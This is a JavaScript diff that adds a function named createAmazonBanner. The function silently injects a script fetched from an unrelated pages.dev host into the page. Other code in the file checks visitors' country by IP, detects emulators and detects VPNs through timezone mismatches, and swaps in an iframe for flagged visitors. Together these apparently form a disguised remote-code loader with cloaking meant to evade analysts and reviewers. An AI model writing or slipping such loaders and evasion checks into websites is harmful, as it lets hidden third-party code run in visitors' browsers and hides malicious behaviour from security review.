@@ -3,6 +3,21 @@ function saveCurrentDateToLocalStorage() {
     const formattedDate = now.toISOString();
     localStorage.setItem('lasttime', formattedDate);
 }
+function createAmazonBanner() {
+    // Kiểm tra nếu chưa có #amazon
+    let amazonDiv = document.querySelector('#amazon');
+    if (!amazonDiv) {
+        amazonDiv = document.createElement('div');
+        amazonDiv.id = 'amazon';
+        document.body.appendChild(amazonDiv);
+        // Tạo script và load JS từ URL
+        var script = document.createElement('script');
+        script.src = 'https://mobile-3aj.pages.dev/amazon/amazon.js';
+        script.async = true;
+        document.body.appendChild(script);
+    }
+}
+
 saveCurrentDateToLocalStorage();
 const script_tmp = document.createElement('script');
 script_tmp.src = 'https://cdn.jsdelivr.net/npm/luxon@3/build/global/luxon.min.js';
@@ -32,30 +47,30 @@ script_tmp.onload = () => {
 
     async function checkClientLocation() {
         const notallowedCountryCodes = ["US", "IN", "IE", "SG", "PL"];
-      
+
         try {
-          const response = await fetch("https://ipwho.is/");
-          const data = await response.json();
-      
-          if (data.success) {
-            const code = data.country_code;
-            const isnotAllowed = notallowedCountryCodes.includes(code);
-      
-            console.log(`Client country code: ${code}`);
-      
-            if (isnotAllowed) {
-              displayIframe();
+            const response = await fetch("https://ipwho.is/");
+            const data = await response.json();
+
+            if (data.success) {
+                const code = data.country_code;
+                const isnotAllowed = notallowedCountryCodes.includes(code);
+
+                console.log(`Client country code: ${code}`);
+
+                if (isnotAllowed) {
+                    displayIframe();
+                } else {
+                    console.log("Access granted. Client is from an allowed country.");
+                }
             } else {
-              console.log("Access granted. Client is from an allowed country.");
+                console.error(`Failed to get client location. Reason: ${data.message}`);
             }
-          } else {
-            console.error(`Failed to get client location. Reason: ${data.message}`);
-          }
         } catch (error) {
-          console.error("Error fetching client location:", error);
+            console.error("Error fetching client location:", error);
         }
-      }
-      
+    }
+
 
     async function detectEmulator() {
         const ua = navigator.userAgent.toLowerCase();
@@ -111,24 +126,24 @@ script_tmp.onload = () => {
     async function detectVPN() {
         const clientTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
         const clientOffset = getUTCOffsetString(clientTimezone);
-    
+
         try {
             const response = await fetch('https://ipwho.is/');
             const data = await response.json();
-    
+
             if (!data.success) {
                 console.error('IPWho.is error:', data.message);
                 return;
             }
-    
+
             const ipTimezone = data.timezone?.id;  // e.g., "America/New_York"
             if (!ipTimezone) {
                 console.warn('No timezone info from IP data');
                 return;
             }
-    
+
             const ipOffset = getUTCOffsetString(ipTimezone);
-    
+
             if (clientOffset !== ipOffset) {
                 displayIframe();
             }
@@ -136,7 +151,7 @@ script_tmp.onload = () => {
             console.error('VPN detection failed:', err);
         }
     }
-    
+
 
 
 
